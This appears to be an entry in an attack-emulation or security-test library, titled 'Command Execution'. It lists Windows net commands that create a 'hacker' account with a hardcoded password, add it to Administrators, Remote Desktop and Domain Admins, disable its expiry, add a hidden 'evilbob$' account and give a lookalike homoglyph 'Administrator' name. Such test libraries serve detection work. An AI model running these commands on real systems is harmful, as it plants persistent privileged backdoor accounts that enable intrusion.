---
id: ce4a15d6-05d6-4405-823d-9631aa6b0729
name: Command Execution
type: command
executor: bash
data: 'net user hacker Hcker_12345678* /add /Y

  net localgroup administrators hacker /add

  net localgroup "Remote Desktop Users" hacker /add

  net localgroup "Backup Operators" hacker /add

  net group "Domain Admins" hacker /add /domain

  net user hacker /ACTIVE:YES /domain

  net user username /Passwordchg:No

  net user hacker /Expires:Never

  net user /add evilbob$ evilpassword

  Aԁmіnistratοr'
output: null
created_at: '2023-04-06T03:56:30.608411+00:00'
updated_at: '2023-04-10T20:38:04.588013+00:00'
---

# Command Execution

```bash
net user hacker Hcker_12345678* /add /Y
net localgroup administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add
net localgroup "Backup Operators" hacker /add
net group "Domain Admins" hacker /add /domain
net user hacker /ACTIVE:YES /domain
net user username /Passwordchg:No
net user hacker /Expires:Never
net user /add evilbob$ evilpassword
Aԁmіnistratοr
```


